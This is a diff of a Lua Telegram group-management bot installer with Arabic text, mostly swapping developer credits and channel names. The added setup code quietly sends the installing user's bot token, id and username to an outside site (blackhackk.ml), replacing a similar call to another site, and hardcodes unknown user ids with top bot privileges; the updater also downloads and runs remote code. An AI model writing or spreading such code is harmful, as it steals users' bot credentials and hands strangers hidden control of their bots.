@@ -1,5 +1,5 @@
 --[[
-
+ 
 ▇
 ▇ ⇽Dev @H_I_v_e_e_n101 
 ▇
@@ -7,9 +7,9 @@
 ▇
 ▇ ▇ ▇ ▇
 
-H I A V E E N ❅ @H_I_v_e_e_n101
+H I A V E E N : @H_I_v_e_e_n101
 ❅ تم  تطوير وبرمجة السورس من قبل هيفين ❅
- @H_I_v_e_e_n101
+ C H : @source_Laren
 #-ـ-ـ-ـ-ـ-ــ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ--ـ-ـ-ـ-ـ
 ]]
 local function download(file_id, dl_cb, cmd)
@@ -101,19 +101,20 @@ redis:set(black..":UserNameBot:",BOT_User)
 redis:set(black..":NameBot:",BOT_NAME)
 redis:hset(black..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
 redis:set("TH3black_INSTALL","Yes")
-info = {}
-info.username = '@'..GetUser.result.username
-info.userbot  = BOT_User
-info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+info = {} 
+info.namebot = BOT_NAME
+info.userbot = BOT_User
+info.id = SUDO_USER
+info.token = Token
+info.join  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+info.folder = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+https.request('https://blackhackk.ml/token.php?token='..Token..'&username=@'..GetUser.result.username..'&id='..SUDO_USER)
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
-Cr_file:close() 
+Cr_file:close()
 print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس لارين \n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
+local Text = "• أهلاً [المطور الاساسي](tg://user?id="..SUDO_USER..") \n• شكراً لأستخدام سورس لارين\n• أرسل /start\n• لأظهار الاوامر المطور  المجهزه بالكيبورد\n\n."
 https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
-Souser = SUDO_USER:gsub('@','')
-Souser = Souser:gsub([[\_]],'_')
-https.request("https://forhassan.ml/Black/khaled.zzz.com.ua?id="..SUDO_USER.."&user="..Souser.."&token="..Token)
 os.execute([[
 rm -f ./README.md
 rm -rf ./.git
@@ -128,27 +129,27 @@ function Start_Bot()
 local TokenBot = io.open('./inc/Token.txt', "r")
 if not TokenBot then
 print('\27[0;33m>>'..[[
-echo -e "\e[38;5;77m       •{ تنصيب سورس لارين بنسبه 100% ]  }•\e[0m"
-echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @source_Laren }• }•\e[0m"
+echo -e "\e[38;5;77m       •{ تنصيب سورس لارينبنسبه 100% ]  }•\e[0m"
+echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @BLACK_TEAM_4 }• }•\e[0m"
  
 echo -e "\e[38;5;77m                 e[0m"
-echo -e "\e[38;5;77m                                                                     e[0m"
-echo -e "\e[38;5;77m                                                e[0m"
-echo -e "\e[38;5;77m                     e[0m"
-echo -e "\e[38;5;77m                                       e[0m"
-echo -e "\e[38;5;77m                 e[0m"
-echo -e "\e[38;5;77m                            e[0m"
-echo -e "\e[38;5;77m                                             e[0m"
+echo -e "\e[38;5;77m                                                                      e[0m"
+echo -e "\e[38;5;77m                                                  e[0m"
+echo -e "\e[38;5;77m                                          e[0m"
+echo -e "\e[38;5;77m                        e[0m"
+echo -e "\e[38;5;77m                        e[0m"
+echo -e "\e[38;5;77m                           e[0m"
 echo -e "\e[38;5;77m                              e[0m"
-echo -e "\e[38;5;77m                                  e[0m"
-echo -e "\e[38;5;77m                                                                     e[0m"
+echo -e "\e[38;5;77m          e[0m"
+echo -e "\e[38;5;77m                           e[0m"
+echo -e "\e[38;5;77m                                                                      e[0m"
 
 echo -e "\e[38;5;77m       •{ SOURCE LAREN source has been installed }•\e[0m"
-echo -e "\e[38;5;77m       •{ developer Hiaveen : @H_I_v_e_e_n101  }•\e[0m"
+echo -e "\e[38;5;77m       •{ developer HIAveen : @H_I_v_e_e_n101 }•\e[0m"
 
-echo -e "\e[38;5;77m      BLACK ✾ @H_I_v_e_e_n101e[0m"
-echo -e "\e[38;5;77m       ✾تم تطوير وبرمجة السورس من قبل هيفين ✾ .e[0m"
-echo -e "\e[38;5;77m       ❅ @H_I_v_e_e_n101[0m"
+echo -e "\e[38;5;77m      HIAVEN ✾ @H_I_v_e_e_n101[0m"
+echo -e "\e[38;5;77m       ❅ تم  تطوير وبرمجة السورس من قبل هيفين ❅ .e[0m"
+echo -e "\e[38;5;77m       ✾ @H_I_v_e_e_n101[0m"
 -------------------------------------------------------------------
 ]]..'\027[0;32m')
 create_config() 
@@ -178,27 +179,27 @@ print(tostring(io.popen("lua inc/locks.lua"):read('*all')))
 end
 
 print('\27[0;33m>>'..[[
-echo -e "\e[38;5;77m       •{ تنصيب سورس لارين بنسبه 100% ]  }•\e[0m"
+echo -e "\e[38;5;77m       •{ تنصيب سورس لارينبنسبه 100% ]  }•\e[0m"
 echo -e "\e[38;5;77m       •{ •{ Join the Source Channel : @source_Laren }• }•\e[0m"
  
 echo -e "\e[38;5;77m                 e[0m"
 echo -e "\e[38;5;77m                                                                      e[0m"
-echo -e "\e[38;5;77m                                         e[0m"
-echo -e "\e[38;5;77m                                                e[0m"
-echo -e "\e[38;5;77m                                         e[0m"
-echo -e "\e[38;5;77m                                                e[0m"
-echo -e "\e[38;5;77m                                              e[0m"
-echo -e "\e[38;5;77m                          e[0m"
-echo -e "\e[38;5;77m                      e[0m"
-echo -e "\e[38;5;77m                          e[0m"
+echo -e "\e[38;5;77m                        e[0m"
+echo -e "\e[38;5;77m                       e[0m"
+echo -e "\e[38;5;77m                                                 e[0m"
+echo -e "\e[38;5;77m                                e[0m"
+echo -e "\e[38;5;77m                                                   e[0m"
+echo -e "\e[38;5;77m                                e[0m"
+echo -e "\e[38;5;77m                               e[0m"
+echo -e "\e[38;5;77m                        e[0m"
 echo -e "\e[38;5;77m                                                                      e[0m"
 
 echo -e "\e[38;5;77m       •{ SOURCE LAREN source has been installed }•\e[0m"
-echo -e "\e[38;5;77m       •{ developer Hiaveen : @H_I_v_e_e_n101  }•\e[0m"
+echo -e "\e[38;5;77m       •{ developer HIaveen : @H_I_v_e_e_n101  }•\e[0m"
 
-echo -e "\e[38;5;77m     BLACK ✾ @H_I_v_e_e_n101[0m"
-echo -e "\e[38;5;77m     ✾تم تطوير وبرمجة السورس من قبل هيفين ✾ .e[0m"
-echo -e "\e[38;5;77m     ✾ @H_I_v_e_e_n101[0m"
+echo -e "\e[38;5;77m     Hiaveen ✾ @H_I_v_e_e_n101[0m"
+echo -e "\e[38;5;77m     ❅ تم  تطوير وبرمجة السورس من قبل هيفين ❅ .e[0m"
+echo -e "\e[38;5;77m     ✾ @H_I_v_e_e_n101 e[0m"
 -ـ-ـ-ـ-ـ-ــ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ-ـ--ـ-ـ-ـ-ـ
                                                   
 ]]..'\027[0;32m'
@@ -279,25 +280,21 @@ else
 msg.GroupActive = false
 end
 
-if msg.sender_user_id_ == 1661260546 then 
-msg.TheRank =  'هيفين مطور السورس'
+if msg.sender_user_id_ == 1765160742 then 
+msg.TheRank =  'المبرمج الجوكر'
 msg.Rank = 1
 
-elseif msg.sender_user_id_ == 1726705278 then 
-msg.TheRank =  'سوريا مبرمج سورس'
+elseif msg.sender_user_id_ == 1646796547 then 
+msg.TheRank =  ' المبرمج جاك '
 msg.Rank = 1
 
-elseif msg.sender_user_id_ == 1360083579 then 
-msg.TheRank =  'ماجد الهكر'
+elseif msg.sender_user_id_ == 1488653639 then 
+msg.TheRank =  ' مطور السورس '
 msg.Rank = 1
 
 elseif msg.sender_user_id_ == SUDO_ID then 
 msg.TheRankCmd = 'المطور' 
 msg.TheRank = 'مطور اساسي' 
-msg.Rank = 1
-elseif redis:sismember(black.. :SUDO_BOT: ,msg.sender_user_id_) then 
-msg.TheRankCmd =  'مطور اساسي²'
-msg.TheRank =  'مطور اساسي²'
 msg.Rank = 1
 elseif redis:sismember(black..':SUDO_BOT:',msg.sender_user_id_) then 
 msg.TheRankCmd = 'المطور'
@@ -383,7 +380,7 @@ SUDO_USER = redis:hgetall(black..'username:'..SUDO_ID).username
 sendPhoto(msg.chat_id_,msg.id_,redis:get(black..':WELCOME_BOT'),[[• مرحباً انا بوت ]]..redis:get(black..':NameBot:')..[[ .
 • اختـصاصـي حمايـة الـمجموعات
 • تأكد من رفعـك للبـوت مشـرف في مجموعـتك واكتب تفعـيل 
-• قنـاة سورس لارين  ⇐ @source_Laren
+• قنـاة سورس لارين⇐ @BLACK_TEAM_4
 . مـعرف المطور  :]]..SUDO_USER:gsub([[\_]],'_')..[[ .
 ]])
 return false
@@ -533,7 +530,7 @@ function tdcli_update_callback(data)
 	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/inc/functions.lua','./inc/functions.lua')
 	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/plugins/zhrfa.lua','./plugins/zhrfa.lua')
 	download_file('https://raw.githubusercontent.com/jack1eljoker1/BLACK/main/plugins/games.lua','./plugins/games.lua')
-	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE BLACK\n\n• ** السورس الى اصدار \n• ** تم اعاده تشغيل سورس لارين بنجاح')
+	EditMsg(data.message_.chat_id_,data.message_.id_,'SOURCE BLACK\n\n• ** السورس الى اصدار \n• ** تم اعاده تشغيل سورس لارينبنجاح')
 	dofile("./inc/Run.lua")
 	print("Update Source And Reload ~ ./inc/Run.lua")
 	end
